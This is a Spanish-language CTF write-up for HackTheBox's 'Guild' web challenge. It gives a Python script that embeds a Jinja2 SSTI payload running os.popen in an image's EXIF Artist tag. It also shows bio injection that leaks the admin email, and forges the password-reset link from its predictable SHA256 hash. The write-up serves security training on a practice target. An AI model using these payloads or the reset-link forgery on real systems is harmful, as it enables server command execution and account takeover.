---
title: Guild Web CTF - HackTheBox
layout: page
permalink: /writeups/HTB/CTF/guild
date: 2025-02-14 11:00:00 +0000
categories: [HacktheBox, CTF, Web]
tags: [HacktheBox, CTF, Web]
image:
  path: /assets/img/cabeceras_genericas/htb.jpg
  alt: Guild Web CTF - HackTheBox
description: >
  Guía de explotación de vulnerabilidades en el CTF HackTheBox Guild Web.
pin: false  
toc: true   
math: false 
mermaid: false 
---

# Creación del usuario

![alt text](/assets/img/posts/guild-ctf-htb/image.png)

Creamos un usuario cualquiera de forma sencilla.

Una vez creado podemos iniciar sesión.

![alt text](/assets/img/posts/guild-ctf-htb/image-1.png)

# Creación del payload

Para poder obtener la flag vamos a necesitar crear una imagen .jpg con un tag "artist" 

Script para crear la imagen:

```python
from PIL import Image
import piexif

def create_exif_exploit():
    # Crear una imagen nueva
    img = Image.new('RGB', (50, 50), color='white')
    
    # Crear datos EXIF - El tag Artist está en el IFD principal (0th)
    zeroth_ifd = {
        piexif.ImageIFD.Artist: "{{config.__class__.__init__.__globals__['os'].popen('cat flag.txt').read()}}".encode('utf-8')
    }
    
    # Generar el diccionario EXIF completo
    exif_dict = {"0th": zeroth_ifd, "Exif": {}, "1st": {}, "thumbnail": None, "GPS": {}}
    
    # Convertir el diccionario a bytes
    exif_bytes = piexif.dump(exif_dict)
    
    # Guardar la imagen con los datos EXIF
    img.save('exploit.jpg', 'JPEG', exif=exif_bytes)
    print("Imagen creada con éxito: exploit.jpg")

if __name__ == "__main__":
    create_exif_exploit()

```

Con este script crearemos la imagen con el tag "artist" y podremos obtener la flag que se encuentra en la raiz de la web.

![alt text](/assets/img/posts/guild-ctf-htb/image-2.png)

Una vez subida la imagen para poder ejecutar el payload hay que conseguir acceso a la cuenta de administrador.

# Acceso a la cuenta de administrador

Como sabemos por el código de la web, la cuenta de administrador se genera automáticamente al crear el docker además de que la cuenta de mail generada así como la contraseña son 8 carácteres en hexadcimal generados aleatoriamente.

Esto imposibilita la idea de realizar un ataque de fuerza bruta.

Teniendo esto en cuenta y analizando el comportamiento de la web podemos realizar una inyección SSTI en la bio del usuario que tenemos registrado para poder obtener la el mail de la cuenta de administrador.

## Análisis de código

Si bien en el template de la bio la inyección no se puede llevar a cabo, en la generación de página para compartir el perfil de usuario la situación es diferente.

```python
@views.route("/user/<link>")
def share(link):
    query = Validlinks.query.filter_by(validlink=link).first()
    if query:
        email = query.email
        query1 = User.query.filter_by(email=email).first()
        bio = Verification.query.filter_by(user_id=query1.id).first().bio
        temp = open("/app/website/templates/newtemplate/shareprofile.html", "r").read()
        return render_template_string(temp % bio, User=User, Email=email, username=query1.username)
```

Si observamos las variables que se le pasan al render_template_string, vemos que se pasa el modelo User completo. En Flask/SQLAlchemy podemos usar esto para hacer queries. Por lo tanto podríamos intentar pasar una query consultando el correo de la cuenta de administrador.

`User.query.filter_by (username='admin').first().email`

## Exploit

![alt text](/assets/img/posts/guild-ctf-htb/image-3.png)

Hacemos click donde dice "share profile" y copiamos el link.

![alt text](/assets/img/posts/guild-ctf-htb/image-4.png)

![alt text](/assets/img/posts/guild-ctf-htb/image-5.png)

`4758505255527057@master.guild`

Ahora que tenemos el mail vamos a explotar el forget password.

# Explotando el forget password

Ahora que sabemos el mail de administrador podemos forzar el cambio de contraseña explotando una vulnerabilidad que hemos econtrado en el código.

Necesitamos primero indicar que hemos olvidado la contraseña de la cuenta de administrador con su mail.

Volvemos al login y hacemos click en "Forgot password?", introducimos el mail de administrador y pulsamos el botón "Send".

![alt text](/assets/img/posts/guild-ctf-htb/image-6.png)

Ahora como podemos ver en el código fuente, se genera un hash sha256 con el mail de la cuenta de administrador y esto se pasa a la función changepasswd.

1. Funcion para cambiar generando el hash:

```python
@views.route("/forgetpassword", methods=["GET", "POST"])
def forgetpassword():
    if request.method == "POST":
        email = request.form.get("email")
        query = User.query.filter_by(email=email).first()
        if query:
            # El hash es simplemente el SHA256 del email
            reset_url = str(hashlib.sha256(email.encode()).hexdigest())
```

2. Función para cambiar la contraseña:

```python
@views.route("/changepasswd/<Hash>",methods=["GET", "POST"])
def changepasswd(Hash):
    query = Validlinks.query.filter_by(validlink=Hash).first()
```

Sabiendo esto y que ya hemos generado en la base de datos la petición de cambio de contraseña podemos hacer el siguiente ataque.

Creamos exactamente la misma función que genera el hash del codigo.

```python
import hashlib

# Reemplaza esto con el email que obtuviste
admin_email = "4758505255527057@master.guild"

# Calcular el hash
reset_url = hashlib.sha256(admin_email.encode()).hexdigest()
print(reset_url)
```

Copiamos el hash y lo pasamos a la función changepasswd.

```bash
❯ python3 hashmail.py
336337986c1d078c19ef0aecef621d163fc5acc8feebde5efb2ffd79704f542e
```	
![alt text](/assets/img/posts/guild-ctf-htb/image-7.png)

Con esto conseguimos cambair la contraseña del usuario administrador.

# Obtención de la flag

Ahora que acceso al panel de verificación de imágenes, podemos obtener la flag.

![alt text](/assets/img/posts/guild-ctf-htb/image-8.png)

Si hacemos click en verify ejecutaremos el SSTI y obtendremos la flag.

![alt text](/assets/img/posts/guild-ctf-htb/image-9.png)

